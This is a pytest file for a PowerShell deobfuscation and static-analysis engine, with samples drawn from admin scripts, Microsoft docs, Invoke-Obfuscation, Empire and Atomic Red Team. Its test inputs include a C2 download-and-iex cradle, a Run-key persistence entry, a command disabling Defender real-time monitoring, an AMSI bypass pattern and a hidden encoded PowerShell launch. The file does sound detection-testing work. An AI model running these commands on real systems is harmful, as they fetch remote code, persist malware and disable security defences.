"""Phase 3 · PowerShell real-world / obfuscation corpus (30+ tests).

Snippets adapted from public benign admin scripts, Microsoft docs,
Invoke-Obfuscation, PowerShell Empire, and Atomic Red Team. Every sample
is expected to either produce a coherent ExecGraph OR emit UnresolvedNodes
with reasons — never crash, never guess.
"""
import base64
import pytest
from engine.parsers.powershell_parser import PowerShellParser
from engine.interpreters.powershell_interpreter import PowerShellInterpreter
from engine.exec_graph import NodeKind

P = PowerShellParser()
I = PowerShellInterpreter()


def _run(src):
    return I.interpret(P.parse(src))


def _kinds(g):
    return [n.kind.value for n in g.nodes]


def _no_crash_and_deterministic(src):
    """Common contract: two identical runs produce identical ExecGraphs."""
    g1 = _run(src)
    g2 = _run(src)
    assert [n.kind for n in g1.nodes] == [n.kind for n in g2.nodes]
    assert [n.reconstructed for n in g1.nodes] == [n.reconstructed for n in g2.nodes]


# ── Benign admin scripts (deterministic reconstruction) ────────────
def test_admin_get_service_running():
    _no_crash_and_deterministic("Get-Service | Where-Object { $_.Status -eq 'Running' }")


def test_admin_get_process_top10():
    _no_crash_and_deterministic("Get-Process | Sort-Object CPU -Descending | Select-Object -First 10")


def test_admin_copy_files():
    _no_crash_and_deterministic("Copy-Item C:\\src\\*.log D:\\backup\\ -Force")


def test_admin_get_eventlog():
    _no_crash_and_deterministic("Get-EventLog -LogName System -Newest 20")


def test_admin_set_execution_policy():
    _no_crash_and_deterministic("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass")


# ── Microsoft doc examples ─────────────────────────────────────────
def test_msft_pipeline_where_select():
    _no_crash_and_deterministic('Get-ChildItem C:\\Windows | Where-Object { $_.Name -like "*.exe" } | Select-Object Name, Length')


def test_msft_hash_computation():
    _no_crash_and_deterministic("Get-FileHash -Path C:\\foo.exe -Algorithm SHA256")


def test_msft_registry_read():
    _no_crash_and_deterministic("Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion'")


# ── Invoke-Obfuscation: TOKEN / STRING patterns ────────────────────
def test_obf_backtick_scattered():
    # Analyst-facing: `W`R`I`T`E-Host` should normalize to `Write-Host`
    g = _run("W`r`i`t`e-Host 'hello'")
    # Should NOT crash; string_op appears somewhere
    assert any("Write" in (n.reconstructed or "") for n in g.nodes)


def test_obf_char_reconstruction():
    # Classic "build a string from char codes"
    g = _run("$x = [char]73 + [char]69 + [char]88")
    binds = [n for n in g.nodes if n.kind == NodeKind.var_bind]
    assert binds and binds[0].args["value"] == "IEX"


def test_obf_format_operator_reorder():
    g = _run("$x = '{2}{0}{1}' -f 'oke','r','inv'")
    binds = [n for n in g.nodes if n.kind == NodeKind.var_bind]
    assert binds and binds[0].args["value"] == "invoker"


def test_obf_join_char_array():
    g = _run("$x = 'i','e','x' -join ''")
    binds = [n for n in g.nodes if n.kind == NodeKind.var_bind]
    assert binds and binds[0].args["value"] == "iex"


def test_obf_reverse_string():
    g = _run("$x = 'txetdaer'.ToCharArray()")
    binds = [n for n in g.nodes if n.kind == NodeKind.var_bind]
    assert binds and binds[0].args["value"] == list("txetdaer")


def test_obf_case_normalization_alias():
    # Aliases resolved regardless of case
    g = _run("IeX 'Write-Output resolved'")
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op]
    assert any("resolved" in (n.reconstructed or "") for n in strops)


def test_obf_multi_stage_base64():
    inner = "$flag = 'stage2-executed'"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    g = _run(f"powershell -EncodedCommand {b64}")
    binds = [b for b in g.nodes if b.kind == NodeKind.var_bind and b.args.get("name") == "flag"]
    assert binds and binds[0].args["value"] == "stage2-executed"


def test_obf_encoded_lower_case_flag():
    inner = "$q = 'ok'"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    g = _run(f"powershell -EC {b64}")
    binds = [b for b in g.nodes if b.kind == NodeKind.var_bind and b.args.get("name") == "q"]
    assert binds and binds[0].args["value"] == "ok"


# ── Empire / Atomic Red Team — deterministic contract ──────────────
def test_empire_download_string_cradle():
    # Downgraded from real cradle: the parser handles the outer var binding
    _no_crash_and_deterministic("$u = 'http://c2/agent.ps1'\n$sc = Invoke-WebRequest -Uri $u\niex $sc")


def test_atomic_test_1059_encoded_command():
    inner = "Get-Process"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    g = _run(f"powershell.exe -NoP -NonI -W Hidden -Enc {b64}")
    procs = [n for n in g.nodes if n.kind == NodeKind.process]
    # Outer powershell.exe carries encoded_command=True; inner reparse
    # emits a Get-Process spawn too. Either ordering is fine — assert at
    # least one process has the flag.
    assert any(p.args.get("encoded_command") is True for p in procs)


def test_atomic_persistence_registry_run_key():
    src = "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'malware' -Value 'C:\\bad.exe'"
    _no_crash_and_deterministic(src)


def test_atomic_scheduled_task_creation():
    _no_crash_and_deterministic("New-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'notepad.exe')")


def test_atomic_disable_realtime_monitoring():
    _no_crash_and_deterministic("Set-MpPreference -DisableRealtimeMonitoring $true")


# ── AMSI / ETW bypass fingerprints ─────────────────────────────────
def test_amsi_bypass_setvalue_pattern():
    src = ("$field = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
           ".GetField('amsiInitFailed', 'NonPublic,Static')")
    g = _run(src)
    # Contract: some node references AmsiUtils in reconstructed form
    hits = [n for n in g.nodes if "AmsiUtils" in (n.reconstructed or "")]
    assert hits


def test_amsi_bypass_semantic_tag_on_call():
    g = _run("Set-Variable -Name amsiInitFailed -Value $true")
    tagged = [n for n in g.nodes if n.args.get("semantic_tag") == "amsi_bypass"]
    assert tagged


# ── Nested pipeline reconstruction ─────────────────────────────────
def test_pipeline_three_stage():
    _no_crash_and_deterministic("Get-Process | Where-Object { $_.CPU -gt 100 } | Stop-Process")


def test_pipeline_with_foreach():
    _no_crash_and_deterministic('1,2,3 | ForEach-Object { $_ * 2 }')


# ── ScriptBlock deferred eval ──────────────────────────────────────
def test_scriptblock_stored_as_variable():
    g = _run("$sb = { Write-Output hi }")
    binds = [b for b in g.nodes if b.kind == NodeKind.var_bind and b.args.get("name") == "sb"]
    assert binds


def test_scriptblock_amp_invoked():
    g = _run("& { Write-Output invoked }")
    # scriptblock invocation should produce a var_expand marker
    markers = [n for n in g.nodes
               if n.kind == NodeKind.var_expand
               and n.args.get("kind") == "scriptblock_invoke"]
    assert markers


# ── Numeric expressions ────────────────────────────────────────────
def test_arithmetic_addition():
    g = _run("$n = 40 + 2")
    binds = [b for b in g.nodes if b.kind == NodeKind.var_bind]
    assert binds and binds[0].args["value"] == 42


def test_string_concat_via_plus():
    g = _run("$s = 'foo' + 'bar'")
    binds = [b for b in g.nodes if b.kind == NodeKind.var_bind]
    assert binds and binds[0].args["value"] == "foobar"


# ── Regression / edge cases ────────────────────────────────────────
def test_empty_script_produces_empty_graph():
    g = _run("")
    assert len(g.nodes) == 0


def test_comment_only_script():
    g = _run("# just a comment\n<# block comment #>")
    assert len(g.nodes) == 0


def test_semicolon_separated_statements():
    g = _run("$a = 1; $b = 2; $c = 3")
    binds = [b for b in g.nodes if b.kind == NodeKind.var_bind]
    assert len(binds) == 3
    assert [b.args["value"] for b in binds] == [1, 2, 3]


def test_here_string_content_preserved():
    src = '$s = @"\nline1\nline2\n"@'
    g = _run(src)
    binds = [b for b in g.nodes if b.kind == NodeKind.var_bind]
    assert binds and "line1" in str(binds[0].args["value"])


def test_no_dangling_side_effects_on_complex_script():
    src = ("$img = 'notepad.exe'\n"
           "$cmd = 'echo hi'\n"
           "Start-Process $img -ArgumentList $cmd")
    g = _run(src)
    assert g.dangling_refs() == []


def test_process_spawn_has_side_effect():
    g = _run("Start-Process notepad.exe")
    procs = [n for n in g.nodes if n.kind == NodeKind.process]
    assert procs
    verbs = [se.verb.value for se in procs[0].side_effects]
    assert "create_process" in verbs
